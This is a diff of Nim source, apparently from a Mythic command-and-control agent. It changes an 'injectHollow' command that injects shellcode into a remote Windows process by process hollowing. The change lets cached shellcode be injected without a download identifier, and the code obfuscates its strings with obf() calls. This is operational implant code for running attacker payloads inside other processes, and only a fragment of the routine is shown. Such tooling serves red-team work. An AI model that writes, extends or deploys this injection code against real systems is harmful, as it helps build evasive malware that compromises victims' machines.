@@ -281,20 +281,25 @@ proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
   ## Inject shellcode into a remote process using process hollowing
   when defined(windows):
     try:
-      let args = to(params, InjectHollowArgs)
-      
-      debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
-      debug &"[DEBUG] Technique: {args.technique}"
-      debug &"[DEBUG] UUID for download: {args.uuid}"
-      
-      # Check if using cached file
+      # Check if using cached file first (no uuid needed)
       if params.hasKey(obf("cached")):
         let cachedName = params[obf("cached")].getStr()
         let cachedData = getCachedFile(cachedName)
         if cachedData.len == 0:
           return mythicError(taskId, obf("File not found in cache. Use register_file first: ") & cachedName)
-        var fileData: seq[byte] = @[]
-        return processInjectHollowChunk(taskId, params, encode(cast[string](cachedData)), 1, 1, fileData)
+        # Build params with dummy uuid for downstream parsing
+        var cachedParams = copy(params)
+        if not cachedParams.hasKey(obf("uuid")):
+          cachedParams[obf("uuid")] = %""
+        var fileData = cachedData
+        return processInjectHollowChunk(taskId, cachedParams, "", 1, 1, fileData)
+      
+      # Non-cached: parse full args (uuid required)
+      let args = to(params, InjectHollowArgs)
+      
+      debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
+      debug &"[DEBUG] Technique: {args.technique}"
+      debug &"[DEBUG] UUID for download: {args.uuid}"
       
       # Return initial response - request the file from Mythic
       return %*{
